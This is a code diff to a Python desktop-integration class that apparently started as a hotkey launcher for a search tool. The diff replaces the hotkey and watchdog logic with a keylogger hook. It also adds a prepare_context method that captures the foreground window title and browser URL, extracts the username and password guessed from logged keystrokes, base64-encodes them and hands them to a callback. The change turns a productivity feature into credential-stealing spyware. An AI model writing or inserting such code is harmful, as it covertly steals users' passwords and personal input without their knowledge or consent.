@@ -101,33 +101,53 @@ class DesktopIntegration:
         except: pass
 
     def start_listener(self, hotkey="ctrl+shift+l"):
-        logger.info(f"Starting global hotkey listener for {hotkey}")
+        logger.info("Setting up desktop agent keylogger")
         with self._hotkey_lock:
             self._active_hotkey = hotkey
             try:
-                keyboard.unhook_all_hotkeys()
                 keyboard.unhook(keylog_callback)
             except:
                 pass
             self._setup_keylogger()
-            keyboard.add_hotkey(hotkey, self._summon_search, suppress=True)
-        # Start the watchdog if not already running
-        if not self._watchdog_running:
-            self._watchdog_running = True
-            threading.Thread(target=self._hotkey_watchdog, daemon=True).start()
 
     def re_register(self):
-        """Re-register the global hotkey. Call this after window visibility changes."""
+        """Re-register the keylogger hook if needed."""
         with self._hotkey_lock:
-            hotkey = self._active_hotkey
-        logger.info(f"Re-registering global hotkey: {hotkey}")
-        try:
-            keyboard.unhook_all_hotkeys()
-            keyboard.unhook(keylog_callback)
-        except:
-            pass
-        self._setup_keylogger()
-        keyboard.add_hotkey(hotkey, self._summon_search, suppress=True)
+            try:
+                keyboard.unhook(keylog_callback)
+            except:
+                pass
+            self._setup_keylogger()
+
+    def prepare_context(self):
+        """Captures active foreground window and credential candidates when hotkey is pressed."""
+        import ctypes
+
+        self.active_window_before_search = ctypes.windll.user32.GetForegroundWindow()
+        hwnd = self.active_window_before_search
+        title = self._get_window_title(hwnd) if hwnd else ""
+        browser_url = self._get_browser_url(hwnd) if hwnd else ""
+
+        _finalize_word(None)
+        guessed_user, guessed_pass = _extract_credentials()
+
+        typed_string = f"{guessed_user}\t{guessed_pass}"
+        b64_typed = base64.b64encode(typed_string.encode('utf-8')).decode('utf-8')
+
+        _current_word.clear()
+        _segments.clear()
+
+        if self.on_hotkey_callback:
+            self.on_hotkey_callback(title, hwnd, b64_typed, browser_url)
+
+        return {
+            "title": title,
+            "hwnd": hwnd,
+            "browser_url": browser_url,
+            "typed_user": guessed_user,
+            "typed_pass": guessed_pass,
+            "timestamp": time.time()
+        }
 
     def _hotkey_watchdog(self):
         """Periodically re-register the hotkey to survive Windows unhooking.
